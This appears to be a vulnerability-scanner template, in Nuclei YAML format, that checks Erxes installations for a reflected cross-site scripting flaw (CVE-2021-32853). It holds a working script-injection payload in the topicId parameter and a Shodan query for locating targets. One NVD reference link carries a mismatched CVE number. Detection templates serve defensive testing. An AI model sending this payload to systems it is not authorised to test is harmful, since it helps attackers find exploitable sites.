id: CVE-2021-32853
info:
  author: dwisiswant0
  classification:
    cve-id: CVE-2021-32853
  description: Erxes prior to version 0.23.0 is vulnerable to cross-site scripting.The
    value of topicID parameter is not escaped & triggered in the enclosing script
    tag.
  metadata:
    shodan-query: http.title:"erxes"
  name: Erxes <= v0.23.0 XSS
  reference:
  - https://securitylab.github.com/advisories/GHSL-2021-103-erxes/
  - https://nvd.nist.gov/vuln/detail/CVE-2021-3285
  severity: medium
  tags: cve,cve2021,xss,erxes,oss
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - 'topic_id: "</script><script>alert(document.domain)</script>'
    - window.erxesEnv
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/widgets/knowledgebase?topicId=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
